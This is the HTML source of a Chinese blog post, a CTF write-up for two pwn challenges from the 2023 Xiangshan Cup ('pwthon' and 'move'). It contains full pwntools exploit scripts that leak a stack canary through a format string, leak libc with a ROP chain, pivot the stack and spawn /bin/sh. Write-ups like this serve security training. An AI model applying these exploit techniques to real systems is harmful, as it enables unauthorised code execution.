@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1dEHXG4QZIISKDtTgL3ZqmQ提取码：q407 pwthon第一次遇见cpython的题，无头苍蝇一样乱撞，坐大牢 给了app.cpython-37m-x86_64-linux-gnu.so和main.py两个文件 最大的问题就是调试环境(跑不起来可太难受了)，题目给的main.py需要把os.mkdir(folder_name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 香山杯">
+<meta property="og:url" content="https://grxer.gitee.io/2023/10/15/2023xsb/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1dEHXG4QZIISKDtTgL3ZqmQ提取码：q407 pwthon第一次遇见cpython的题，无头苍蝇一样乱撞，坐大牢 给了app.cpython-37m-x86_64-linux-gnu.so和main.py两个文件 最大的问题就是调试环境(跑不起来可太难受了)，题目给的main.py需要把os.mkdir(folder_name">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/10/15/2023xsb/image-20231015221314843.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/10/15/2023xsb/image-20231015222245793.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/10/15/2023xsb/image-20231015220838627.png">
+<meta property="article:published_time" content="2023-10-15T13:51:22.000Z">
+<meta property="article:modified_time" content="2023-10-15T14:43:47.382Z">
+<meta property="article:author" content="bxz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/10/15/2023xsb/image-20231015221314843.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2023 香山杯</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2223/08/01/Englishlearning-August2023/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/14/2022-ciscn-syscall-ptrace/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/10/15/2023xsb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/10/15/2023xsb/&text=2023 香山杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/10/15/2023xsb/&is_video=false&description=2023 香山杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 香山杯&body=Check out this article: https://grxer.gitee.io/2023/10/15/2023xsb/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/10/15/2023xsb/&name=2023 香山杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/10/15/2023xsb/&t=2023 香山杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwthon"><span class="toc-number">1.</span> <span class="toc-text">pwthon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#move"><span class="toc-number">2.</span> <span class="toc-text">move</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2023 香山杯
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-15T13:51:22.000Z" itemprop="datePublished">2023-10-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ">https://pan.baidu.com/s/1dEHXG4QZIISKDtTgL3ZqmQ</a><br>提取码：q407</p>
+<h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h2><p>第一次遇见cpython的题，无头苍蝇一样乱撞，坐大牢</p>
+<p>给了app.cpython-37m-x86_64-linux-gnu.so和main.py两个文件</p>
+<p>最大的问题就是调试环境(跑不起来可太难受了)，题目给的main.py需要把<code>os.mkdir(folder_name)</code>改为<code>os.makedirs(folder_name)</code></p>
+<p>3.37的cpython似乎(试了其他版本都没跑起来)只能用3.37才能跑了起来，python main.py就可以跑起来了</p>
+<p>调试就直接attach到python进程上，python进程地址空间可以看到cpython.so被加载进来了</p>
+<p><img src="/2023/10/15/2023xsb/image-20231015221314843.png" alt="image-20231015221314843"></p>
+<p>漏洞主要出现在<code>_pyx_pw_3app_3app_main的_pyx_f_3app_Welcome2Pwnthon</code>(剩余两个函数的长度真的要命)</p>
+<p><img src="/2023/10/15/2023xsb/image-20231015222245793.png" alt="image-20231015222245793"></p>
+<p>看下保护</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22:~/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404$ checksec ./app.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/2023xsb/pwthon_34a4c98f089057330b960f4eba8ae404/app.cpython-37m-x86_64-linux-gnu.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RPATH:    b&#x27;/home/xiran/anaconda3/envs/cython/lib&#x27;</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>白给的基地址这样就可以有pop rdi这样的gadget用，格式化字符串漏洞用来泄露canary(也可以泄露libc地址但是远程栈环境极可能不一样，选择了rop来泄露libc地址)，栈溢出来rop来泄露libc后返回到_pyx_f_3app_Welcome2Pwnthon，再次溢出getshell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">cpython_so=ELF(<span class="string">&#x27;./app.cpython-37m-x86_64-linux-gnu.so&#x27;</span>)</span><br><span class="line">io = process(argv=[<span class="string">&#x27;python&#x27;</span>,<span class="string">&#x27;main.py&#x27;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="comment">#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># b(&#x27;b __printf_chk&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27; gift &#x27;</span>)</span><br><span class="line">cpython_so_base=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&quot;0x7fad184ef8b0&quot;</span>)),<span class="number">16</span>)-<span class="number">0x38b0</span>-(<span class="number">0x7f7af04ec000</span> -<span class="number">0x7f7af04e9000</span>)</span><br><span class="line">p(<span class="string">&#x27;cpython&#x27;</span>,cpython_so_base)</span><br><span class="line"><span class="comment">#0x0000000000003f8f : pop rdi ; ret</span></span><br><span class="line">poprdi=cpython_so_base+<span class="number">0x0000000000003f8f</span></span><br><span class="line">ret=<span class="number">0x000000000000301a</span>+cpython_so_base</span><br><span class="line">app_Welcome2Pwnthon=<span class="number">0x99F0</span>+cpython_so_base</span><br><span class="line">sl(<span class="string">b&#x27;%p&#x27;</span>*<span class="number">14</span>)<span class="comment">#%$p会crash</span></span><br><span class="line">x=rl()</span><br><span class="line">x=io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((x.decode()).split(<span class="string">&quot;0x&quot;</span>)[-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canry&#x27;</span>,canary)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#返回时多pop了rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    cpython_so.got[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    cpython_so.plt[<span class="string">&#x27;puts&#x27;</span>]+cpython_so_base,</span><br><span class="line">    app_Welcome2Pwnthon    </span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line">rl()</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">p(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcbase=puts_ad-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">sl(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">pay=flat(</span><br><span class="line">    cyclic(<span class="number">0x108</span>),</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">#返回时多pop了rdx</span></span><br><span class="line">    poprdi,</span><br><span class="line">    bin_sh_addr,</span><br><span class="line">    ret,</span><br><span class="line">    system</span><br><span class="line">)</span><br><span class="line">sl(pay)</span><br><span class="line"><span class="comment"># sl(b&#x27;cat *fl*&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/10/15/2023xsb/image-20231015220838627.png" alt="image-20231015220838627"></p>
+<h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>常规栈迁移，不过题目给的bss地址太靠近上面的只读段了，所以不能返回_start()，可以返回到main</p>
+<p>第二次read(0, &amp;sskd, 0x20uLL);此时栈已经是sskd附件了，raed可以改掉read自己的返回地址进行rop</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    remotestr=<span class="string">&quot;&quot;</span></span><br><span class="line">    remotestr=remotestr.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io = remote(remotestr[<span class="number">0</span>],<span class="built_in">int</span>(remotestr[<span class="number">1</span>],<span class="number">10</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="number">1</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">bstr = <span class="keyword">lambda</span> x   : <span class="built_in">str</span>(x).encode()</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+<span class="built_in">hex</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbpie</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>(<span class="params">x=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug: gdb.attach(io,x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401350 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401352 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># db(0x401211)</span></span><br><span class="line"><span class="comment"># db(0x040124B)</span></span><br><span class="line">db(<span class="number">0x0401241</span>)</span><br><span class="line"><span class="comment"># db(0x4012A3)</span></span><br><span class="line">sskd=<span class="number">0x04050A0</span></span><br><span class="line">pay=flat(</span><br><span class="line">        <span class="number">0x0000000000401353</span>,</span><br><span class="line">        elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        elf.sym[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        <span class="number">0x0401264</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">sa(<span class="string">b&#x27;number&#x27;</span>,p32(<span class="number">0x12345678</span>))</span><br><span class="line">pay=cyclic(<span class="number">0x30</span>)+p64(sskd-<span class="number">8</span>) +p64(<span class="number">0x040124b</span>)</span><br><span class="line">sa(<span class="string">b&#x27;oLa&#x27;</span>,pay)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay=flat(</span><br><span class="line">         <span class="number">0x0000000000401353</span>,</span><br><span class="line">         bin_sh_addr,</span><br><span class="line">         system</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwthon"><span class="toc-number">1.</span> <span class="toc-text">pwthon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#move"><span class="toc-number">2.</span> <span class="toc-text">move</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/10/15/2023xsb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/10/15/2023xsb/&text=2023 香山杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/10/15/2023xsb/&is_video=false&description=2023 香山杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023 香山杯&body=Check out this article: https://grxer.gitee.io/2023/10/15/2023xsb/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/10/15/2023xsb/&title=2023 香山杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/10/15/2023xsb/&name=2023 香山杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/10/15/2023xsb/&t=2023 香山杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
